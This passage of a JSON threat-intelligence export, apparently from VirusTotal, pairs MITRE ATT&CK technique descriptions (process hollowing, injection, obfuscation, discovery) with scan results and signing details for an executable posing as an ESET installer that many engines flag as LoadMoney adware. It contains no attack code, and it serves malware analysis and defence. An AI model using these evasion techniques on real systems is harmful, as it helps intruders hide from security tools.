                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get hostname"
                  },
                  {
                    "severity": "INFO",
                    "description": "get disk information"
                  },
                  {
                    "severity": "INFO",
                    "description": "get system information on Windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "get disk size"
                  },
                  {
                    "severity": "INFO",
                    "description": "query environment variable"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "check if file exists"
                  },
                  {
                    "severity": "INFO",
                    "description": "get file size"
                  },
                  {
                    "severity": "INFO",
                    "description": "get common file path"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get user security identifier"
                  },
                  {
                    "severity": "INFO",
                    "description": "get session user name"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1087/",
                "id": "T1087",
                "name": "Account Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "query or enumerate registry value"
                  },
                  {
                    "severity": "INFO",
                    "description": "query or enumerate registry key"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              },
              {
                "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get socket status"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1016/",
                "id": "T1016",
                "name": "System Network Configuration Discovery"
              },
              {
                "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nVarious utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.\nOn network devices, Network Device CLI commands such as show users and show ssh can be used to display users currently logged into the device.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get session user name"
                  },
                  {
                    "severity": "INFO",
                    "description": "get token membership"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1033/",
                "id": "T1033",
                "name": "System Owner/User Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection  before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "use process replacement"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/012/",
                "id": "T1055.012",
                "name": "Process Hollowing"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "delete registry value"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1112/",
                "id": "T1112",
                "name": "Modify Registry"
              },
              {
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "set file attributes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1222/",
                "id": "T1222",
                "name": "File and Directory Permissions Modification"
              },
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "write process memory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).\nReflective code injection is very similar to Process Injection except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "use process replacement"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1620/",
                "id": "T1620",
                "name": "Reflective Code Loading"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "encode data using XOR"
                  },
                  {
                    "severity": "INFO",
                    "description": "encode data using Base64"
                  },
                  {
                    "severity": "INFO",
                    "description": "reference Base64 string"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection  before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "use process replacement"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/012/",
                "id": "T1055.012",
                "name": "Process Hollowing"
              },
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "write process memory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/1016a48908fb15bf6228eadf67560f5f406f30c5f752e6d76c260822cbf94783/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65b50304cf63a4a15573af76"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "vhash": "0160a66d5c0d7c051f7f70101011z11z37z1015z1011z101dz",
      "trid": [
        {
          "file_type": "Windows screen saver",
          "probability": 55.3
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 19
        },
        {
          "file_type": "Win16/32 Executable Delphi generic",
          "probability": 8.7
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 8.4
        },
        {
          "file_type": "DOS Executable Generic",
          "probability": 8.4
        }
      ],
      "creation_date": 708992537,
      "names": [
        "egui.exe"
      ],
      "signature_info": {
        "publisher": "Force LLC",
        "product": "ESET Smart Security",
        "verified": "Signed",
        "description": "Eset GUI Installer",
        "file version": "3.0.695 ",
        "original name": "egui.exe",
        "signers": "Force LLC; COMODO RSA Code Signing CA; COMODO SECURE?",
        "copyright": "Copyright (c) Eset 1992-2009. All rights reserved.",
        "signers details": [
          {
            "status": "Valid",
            "valid usage": "Code Signing",
            "name": "Force LLC",
            "algorithm": "sha256RSA",
            "valid from": "1:00 AM 5/5/2015",
            "valid to": "12:59 AM 5/5/2016",
            "serial number": "7F 1F BF EC 9E BD 89 CC B5 43 E7 C5 81 1D E2 23",
            "cert issuer": "COMODO RSA Code Signing CA",
            "thumbprint": "974868E7D1A49B3156E8126AF7EBDED277833A39"
          },
          {
            "status": "Valid",
            "valid usage": "Code Signing",
            "name": "COMODO RSA Code Signing CA",
            "algorithm": "sha384RSA",
            "valid from": "1:00 AM 5/9/2013",
            "valid to": "12:59 AM 5/9/2028",
            "serial number": "2E 7C 87 CC 0E 93 4A 52 FE 94 FD 1C B7 CD 34 AF",
            "cert issuer": "COMODO RSA Certification Authority",
            "thumbprint": "B69E752BBE88B4458200A7C0F4F5B3CCE6F35B47"
          },
          {
            "status": "Valid",
            "valid usage": "Server Auth, Client Auth, Email Protection, Code Signing, Timestamp Signing, EFS, IPSEC Tunnel, IPSEC User",
            "name": "COMODO SECURE?",
            "algorithm": "sha384RSA",
            "valid from": "1:00 AM 1/19/2010",
            "valid to": "12:59 AM 1/19/2038",
            "serial number": "4C AA F9 CA DB 63 6F E0 1F F7 4E D8 5B 03 86 9D",
            "cert issuer": "COMODO RSA Certification Authority",
            "thumbprint": "AFE5D244A8D1194230FF479FE2F897BBCD7A8CB4"
          }
        ]
      },
      "last_modification_date": 1454375818,
      "type_tag": "peexe",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 1250432,
      "popular_threat_classification": {
        "suggested_threat_label": "adware.loadmoney/filetour",
        "popular_threat_category": [
          {
            "count": 5,
            "value": "adware"
          },
          {
            "count": 5,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 9,
            "value": "loadmoney"
          },
          {
            "count": 6,
            "value": "filetour"
          }
        ]
      },
      "authentihash": "6689e64145c5f92a833c97d0176b8a1d2a835a8676e0d85f0b1969daa75a4407",
      "last_submission_date": 1454357072,
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "1.3.0.7400",
          "result": "W32.HfsAdware.8CA4",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "AegisLab",
          "engine_version": "4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "TotalDefense": {
          "category": "undetected",
          "engine_name": "TotalDefense",
          "engine_version": "37.1.62.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "12.0.250.0",
          "result": "Gen:Variant.Application.LoadMoney.94",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "14.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "2.1.1.1115",
          "result": "Adware.LoadMoney",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.2642",
          "result": "Adware.FileTour.Win32.1052",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "TheHacker": {
          "category": "undetected",
          "engine_name": "TheHacker",
          "engine_version": "6.8.0.5.822",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160130"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Gen:Variant.Application.LoadMoney.94",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "9.213.18607",
          "result": "Unwanted-Program ( 004c4b041 )",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "9.213.18607",
          "result": "Unwanted-Program ( 004c4b041 )",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.14.5798",
          "result": "Trojan.Win32.LoadMoney.dxahvt",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "F-Prot": {
          "category": "undetected",
          "engine_name": "F-Prot",
          "engine_version": "4.7.1.166",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160129"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "20151.1.0.32",
          "result": "Packed.Vmpbad!gen35",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "12961",
          "result": "a variant of Win32/Adware.FileTour.AYX",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "9.800.0.1009",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "8.0.1489.320",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160202"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "0.98.5.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "15.0.1.13",
          "result": "HEUR:Trojan.Win32.Generic",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Alibaba": {
          "category": "undetected",
          "engine_name": "Alibaba",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Agnitum": {
          "category": "undetected",
          "engine_name": "Agnitum",
          "engine_version": "5.5.1.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Ad-Aware": {
          "category": "malicious",
          "engine_name": "Ad-Aware",
          "engine_version": "3.0.2.1015",
          "result": "Gen:Variant.Application.LoadMoney.94",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "4.98.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Comodo": {
          "category": "malicious",
          "engine_name": "Comodo",
          "engine_version": "24063",
          "result": "Application.Win32.FileTour.AD",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "11.0.19100.45",
          "result": "Gen:Variant.Application.LoadMoney",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.17.11230",
          "result": "Trojan.LoadMoney.768",
          "method": "blacklist",
          "engine_update": "20160202"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "46912",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "9.740.0.1012",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "McAfee-GW-Edition": {
          "category": "undetected",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2015",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "3.5.0.642",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Cyren": {
          "category": "undetected",
          "engine_name": "Cyren",
          "engine_version": "5.4.16.7",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "Trojan/Generic.bjalu",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.2.4",
          "result": "ADWARE/FileTour.1248152",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "5.1.220.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160202"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "1.0.0.653",
          "result": "Trojan.Application.LoadMoney.94",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "2016.02.02.00",
          "result": "PUP/Win32.FileTour",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.1.12400.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "ByteHero": {
          "category": "undetected",
          "engine_name": "ByteHero",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160202"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "3.12.26.4",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "1.0.1.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160202"
        },
        "Baidu-International": {
          "category": "undetected",
          "engine_name": "Baidu-International",
          "engine_version": "3.5.1.41473",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.18",
          "result": "PE:Malware.Generic(Thunder)!1.A1C4 [F]",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "T3.2.0.4.0",
          "result": "AdWare.FileTour",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "25",
          "result": "Gen:Variant.Application.LoadMoney.94",
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "16.0.0.4522",
          "result": "Win32/Blacked",
          "method": "blacklist",
          "engine_update": "20160202"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20160201"
        },
        "Qihoo-360": {
          "category": "malicious",
          "engine_name": "Qihoo-360",
          "engine_version": "1.0.0.1077",
          "result": "HEUR/QVM16.0.Malware.Gen",
          "method": "blacklist",
          "engine_update": "20160202"
        }
      },
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "sha256": "218ed0de3279c5f215fd1ff221e6cf5a4ab6558c1d913769ccd4759f3338f539",
      "type_extension": "exe",
      "tags": [
        "peexe",
        "signed",
        "overlay"
      ],
      "last_analysis_date": 1454357072,
      "unique_sources": 1,
      "first_submission_date": 1454357072,
      "sha1": "f9473c92b4ab21c8feea8009ed7cb1c4adcb5d1d",
      "ssdeep": "24576:8J8Ctet5yjjK04W5QmGnkCFTerjpINAg33kxoo1VeBkG8:8JdetQh4kATei33Tozen",
      "md5": "1d050d285bc9748b91e79011a2f1b0e7",
      "pe_info": {
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "filetype": "audio/x-wav",
            "sha256": "6a5d193cf09a6734f7e5636df4188560f6a8099a0abd127807b0e943802f45f3",
            "type": "AVI"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "b8e6fc93d423931acbddae3c27dd3c4eb2a394005d746951a971cb700e0ee510",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "ce19ace18e87b572e6912306776226af5b8e63959c61cde70a8ff05b3bbdcc41",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "ee1c9c194199c320c893b367602ccc7ee7270bd4395d029f727e097634f47f8c",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "9d9edf87ca203ecc60b246cc783d54218dd0ce77d3a025d0bafc580995a4abd8",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "99676c52310db365580965ea646ece86c62951bfd97ec0aae9f738a202a90593",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "11726dcf1eebe23a1df5eb0ee2af39196b702eddd69083d646e4475335130b28",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "6f938aab0a03120de4ef8b27aff6ba5146226c92a056a6f04e5ec8d513ce5f9d",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "c0ede68a98bd2bc58c78564dfb42f1640dc29766d3ab2782ab8b5ed28c6fd414",
            "type": "RT_BITMAP"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "46cfc44afa8ab31ae3da35fa8346e4c085c441659d9992b09fc8ad517f2b289a",
            "type": "RT_BITMAP"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "c0ede68a98bd2bc58c78564dfb42f1640dc29766d3ab2782ab8b5ed28c6fd414",
            "type": "RT_BITMAP"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "f8e1696801fe89b88936ac4226cea03bfa5aa345aa33ca982822ae7fbc6557e2",
            "type": "RT_BITMAP"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "cb7421b5c6af74c3159c361f3bb78bba8a488d8979d1250e106fa96cbf928789",
            "type": "RT_BITMAP"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
